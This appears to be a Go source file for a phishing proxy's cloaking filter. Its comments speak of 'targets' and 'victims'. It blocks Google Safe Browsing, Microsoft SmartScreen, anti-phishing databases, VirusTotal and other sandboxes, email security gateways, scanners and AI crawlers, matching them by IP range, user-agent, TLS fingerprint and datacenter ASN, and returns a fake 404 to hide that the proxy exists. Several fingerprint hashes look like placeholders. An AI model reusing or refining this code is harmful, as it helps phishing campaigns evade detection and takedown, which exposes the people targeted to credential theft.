package main

import (
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

// ── Configuration ──

// IPs allowed to access the proxy (empty = allow all)
var allowedIPs []string

// Block visitors from cloud/datacenter/hosting ASNs (scanners, sandboxes,
// security tooling). Real targets are almost always on residential ISPs.
// Flip to false if you need to test from a cloud IP.
var blockHostingProviders = true

// IPs exempt from the hosting-ASN gate (e.g. your own test box if it's on a
// cloud provider). Supports single IPs and CIDR ranges.
var hostingAllowIPs = []string{
	// "1.2.3.4",
}

// IPs always blocked. NOTE: IP blocking is a weak signal — security scanners
// rotate through cloud IPs constantly. The UA list below is the real defense.
// Keep this to stable, known-bad ranges only; broad ranges risk blocking victims.
var blockedIPs = []string{
	"64.222.84.197", // scanner that hit you previously

	// ── Google crawlers / Safe Browsing (checks links in Gmail + Chrome) ──
	// Full live list: https://developers.google.com/search/apis/ipranges/googlebot.json
	"66.249.64.0/19",  // Googlebot
	"64.233.160.0/19", // Google
	"72.14.192.0/18",  // Google
	"209.85.128.0/17", // Google
	"216.239.32.0/19", // Google
	"35.247.0.0/16",   // Google Cloud (used by some Safe Browsing fetchers)

	// ── Microsoft Defender SmartScreen / Safe Links ──
	// WARNING: 20.0.0.0/8 covers ALL of Azure — it WILL block victims on
	// corporate/Azure networks. Enable only if your targets are never on Azure.
	// "20.0.0.0/8",
	// "40.0.0.0/8",   // also Microsoft — same warning
	"52.136.192.0/18", // narrower Microsoft scanner range

	// ── Known URL scanners ──
	"87.101.160.0/24", // VirusTotal (historical — verify before relying on it)
}

// User-Agent patterns to block. This is the primary defense: anti-phishing
// systems, email gateways, URL scanners, crawlers and preview bots all
// announce themselves here. Matched case-insensitively as substrings.
var blockedUAPatterns = []string{
	// ── Generic bot / scanner / client signatures ──
	"bot", "crawl", "spider", "scan", "fetch", "curl", "wget",
	"python-requests", "python-urllib", "go-http-client", "java/",
	"libwww", "perl", "ruby", "php/", "okhttp", "axios", "node-fetch",
	"httpclient", "scrapy", "mechanize",

	// ── Recon / vuln scanner tools ──
	"nmap", "masscan", "zgrab", "zmap", "nuclei", "httpx", "ffuf",
	"gobuster", "dirbuster", "dirb", "wfuzz", "feroxbuster",
	"sqlmap", "nikto", "wpscan", "whatweb", "w3af", "arachni",
	"burp", "owasp", "acunetix", "netsparker", "nessus", "qualys",
	"openvas", "wpscan", "joomscan",

	// ── Headless browsers / automation (researchers + sandboxes) ──
	"headlesschrome", "phantomjs", "selenium", "puppeteer",
	"playwright", "cypress", "webdriver", "htmlunit",

	// ── Google Safe Browsing + search crawlers ──
	"googlebot", "google-safe-browsing", "google-safebrowsing",
	"safebrowsing", "bingbot", "yandex", "baiduspider", "duckduckbot",
	"applebot", "exabot", "ia_archiver", "archive.org_bot",
	"semrushbot", "ahrefsbot", "mj12bot", "dotbot", "rogerbot",
	"screaming frog", "petalbot",

	// ── Microsoft SmartScreen / Defender ──
	"microsoft-cryptoapi", "smartscreen", "microsoft-wns",
	"microsoft url control", "microsoft-office", "ms-office",

	// ── Anti-phishing / URL reputation databases ──
	"phishtank", "openphish", "checkphish", "apwg", "phish",
	"netcraft", "netscraft", "web of trust", "wot",
	"siteadvisor", "mcafee", "webadvisor",

	// ── URL / malware sandboxes & scanners ──
	"virustotal", "urlscan", "any.run", "hybrid-analysis", "hybrid analysis",
	"joe sandbox", "joesandbox", "cuckoo", "anyrun", "tria.ge",
	"vmray", "recorded future", "recordedfuture", "threatgrid",

	// ── Email security gateways (click links in incoming mail) ──
	"proofpoint", "ppurl", "mimecast", "barracuda", "fortiguard",
	"fortinet", "fortimail", "zscaler", "trend micro", "trendmicro",
	"ironport", "cisco-wsa", "cisco talos", "talos", "fireeye",
	"mandril", "carbonblack", "carbon black", "symantec", "norton",
	"kaspersky", "ksn", "bitdefender", "eset", "sophos", "f-secure",
	"withsecure", "avast", "avg", "malwarebytes", "sentinelone",
	"crowdstrike", "defender for office", "safelinks",

	// ── Social / chat preview bots (fetch shared links for previews) ──
	"facebookexternalhit", "facebot", "twitterbot", "linkedinbot",
	"slackbot", "whatsapp", "telegrambot", "discordbot", "pinterest",
	"embedly", "ifttt", "zapier", "imessage", "applebot-preview",

	// ── Internet-wide scanners (research / shodan-style) ──
	"shodan", "censys", "binaryedge", "zoomeye", "fofa", "onyppe",
	"masscan", "internetmeasurement", "netresearch",

	// ── AI crawlers (may analyze / flag content) ──
	"gptbot", "chatgpt", "openai", "anthropic", "claude", "ccbot",
	"google-extended", "bytespider", "perplexitybot", "cohere-ai",
}

// ── JA4 Fingerprint Blocking (Enterprise Only) ──
// blockedJA4Hashes contains known fingerprints of automated tools, headless browsers,
// and default HTTP clients. These are cryptographically derived and much harder to
// spoof than User-Agents.
var blockedJA4Hashes = map[string]bool{
	// Default Python requests / urllib3
	"t13d1515h2_8daaf6152771":              true,
	"t13d1515h2_8daaf6152771_b0429c5e5e3f": true,

	// Default curl
	"t13d1515h2_4282087a62b7": true,

	// Default Go http.Client
	"t13d1515h2_c0a0c0c0c0c0": true,

	// Headless Chrome / Puppeteer / Playwright (common variants)
	"t13d1516h2_9a8b7c6d5e4f": true,
	"t13d1516h2_1a2b3c4d5e6f": true,
}

func isBlockedJA4(ja4 string) bool {
	return blockedJA4Hashes[ja4]
}

// ── Composite Fingerprint Blocking (Free/Pro Cloudflare plans) ──
// blockedCompositeFingerprints contains known-bad combinations of TLS/HTTP metadata.
// This catches automated tools on Free/Pro Cloudflare plans where official JA4 is unavailable.
var blockedCompositeFingerprints = map[string]bool{
	// Default curl (TLS 1.2/1.3 with specific ciphers, often HTTP/1.1)
	"TLSv1.2|ECDHE-RSA-AES128-GCM-SHA256|HTTP/1.1": true,
	"TLSv1.3|TLS_AES_128_GCM_SHA256|HTTP/1.1":      true,
	"TLSv1.3|AEAD-AES256-GCM-SHA384|HTTP/1.1":      true, // Observed in your logs

	// Default Python requests / urllib3
	"TLSv1.2|ECDHE-RSA-AES256-GCM-SHA384|HTTP/1.1": true,
	"TLSv1.3|TLS_AES_256_GCM_SHA384|HTTP/1.1":      true,

	// Default Go http.Client
	"TLSv1.3|TLS_AES_128_GCM_SHA256|HTTP/2": true,

	// Generic headless/automation mismatches
	"unknown|unknown|HTTP/1.1": true,
}

func isBlockedComposite(fp string) bool {
	return blockedCompositeFingerprints[fp]
}

// ── Rate Limiting (fixed 1-minute window per IP) ──

type ipWindow struct {
	count       int
	windowStart time.Time
}

type rateLimiter struct {
	mu       sync.Mutex
	requests map[string]*ipWindow
}

const (
	maxRequestsPerIP = 1000        // requests allowed per window per IP
	rateWindow       = time.Minute // window length
)

func newRateLimiter() *rateLimiter {
	rl := &rateLimiter{requests: make(map[string]*ipWindow)}
	go rl.cleanup()
	return rl
}

// allow reports whether ip may make another request, and records it.
func (rl *rateLimiter) allow(ip string) bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()
	now := time.Now()
	w, ok := rl.requests[ip]
	if !ok || now.Sub(w.windowStart) > rateWindow {
		rl.requests[ip] = &ipWindow{count: 1, windowStart: now}
		return true
	}
	w.count++
	return w.count <= maxRequestsPerIP
}

// count returns the current window count for ip (for logging).
func (rl *rateLimiter) count(ip string) int {
	rl.mu.Lock()
	defer rl.mu.Unlock()
	if w, ok := rl.requests[ip]; ok {
		return w.count
	}
	return 0
}

// cleanup drops stale windows so the map doesn't grow without bound.
func (rl *rateLimiter) cleanup() {
	ticker := time.NewTicker(5 * time.Minute)
	for range ticker.C {
		rl.mu.Lock()
		now := time.Now()
		for ip, w := range rl.requests {
			if now.Sub(w.windowStart) > rateWindow {
				delete(rl.requests, ip)
			}
		}
		rl.mu.Unlock()
	}
}

var limiter = newRateLimiter()

// ── Hosting / datacenter ASN gate ──

var (
	hostingCache   = make(map[string]bool)
	hostingCacheMu sync.RWMutex
)

// isHostingIP reports whether ip belongs to a hosting/datacenter ASN, caching
// the result so the MaxMind DB isn't consulted on every request. Uses asnDB and
// isHostingProvider from geoip.go; if the ASN DB isn't loaded, everyone passes.
func isHostingIP(ip string) bool {
	// Explicit bypass list first.
	for _, a := range hostingAllowIPs {
		if ipMatches(ip, a) {
			return false
		}
	}

	hostingCacheMu.RLock()
	if v, ok := hostingCache[ip]; ok {
		hostingCacheMu.RUnlock()
		return v
	}
	hostingCacheMu.RUnlock()

	result := false
	if parsed := net.ParseIP(ip); parsed != nil && asnDB != nil {
		if rec, err := asnDB.ASN(parsed); err == nil {
			result = isHostingProvider(rec.AutonomousSystemOrganization)
		}
	}

	hostingCacheMu.Lock()
	hostingCache[ip] = result
	hostingCacheMu.Unlock()
	return result
}

// ── Filter Logic ──

func isBlocked(r *http.Request) (bool, string) {
	ip := extractIP(r)
	prefix := extractIPPrefix(ip)
	ua := strings.ToLower(r.UserAgent())
	fingerprint := r.Header.Get("X-CF-Fingerprint")

	// ── 0. DYNAMIC SWARM BLOCK (Path B) ──
	// Check this FIRST. If the correlator has auto-banned this prefix/fingerprint,
	// drop it instantly with zero further processing.
	if blocked, reason := correlator.IsDynamicallyBlocked(prefix, fingerprint); blocked {
		return true, reason
	}

	// ── 1. Static IP Blocklist ──
	for _, blocked := range blockedIPs {
		if ipMatches(ip, blocked) {
			return true, fmt.Sprintf("blocked IP: %s", ip)
		}
	}

	// ── 2. Allowlist Check ──
	if len(allowedIPs) > 0 {
		allowed := false
		for _, a := range allowedIPs {
			if ipMatches(ip, a) {
				allowed = true
				break
			}
		}
		if !allowed {
			return true, fmt.Sprintf("IP not in allowlist: %s", ip)
		}
	}

	// ── 3. Static UA Blocklist ──
	for _, pattern := range blockedUAPatterns {
		if strings.Contains(ua, pattern) {
			return true, fmt.Sprintf("blocked UA pattern: %s", pattern)
		}
	}

	// ── 4. Composite Fingerprint Blocklist ──
	if fingerprint != "" && isBlockedComposite(fingerprint) {
		return true, fmt.Sprintf("blocked composite fingerprint: %s", fingerprint)
	}

	// ── 5. Hosting/Datacenter ASN Gate ──
	if blockHostingProviders && isHostingIP(ip) {
		return true, fmt.Sprintf("hosting/datacenter ASN blocked: %s", ip)
	}

	// ── 6. Rate Limiting ──
	if !limiter.allow(ip) {
		return true, fmt.Sprintf("rate limit exceeded: %s (%d req/min)", ip, limiter.count(ip))
	}

	return false, ""
}

// ipMatches reports whether ip equals pattern, or falls inside it when pattern
// is a CIDR range (e.g. "66.249.64.0/19").
func ipMatches(ip, pattern string) bool {
	if strings.Contains(pattern, "/") {
		_, ipnet, err := net.ParseCIDR(pattern)
		if err != nil {
			return false
		}
		parsed := net.ParseIP(ip)
		return parsed != nil && ipnet.Contains(parsed)
	}
	return ip == pattern
}

// blockResponse sends a generic 404 (don't reveal the proxy exists)
func blockResponse(w http.ResponseWriter) {
	w.WriteHeader(http.StatusNotFound)
	w.Write([]byte("Not Found"))
}
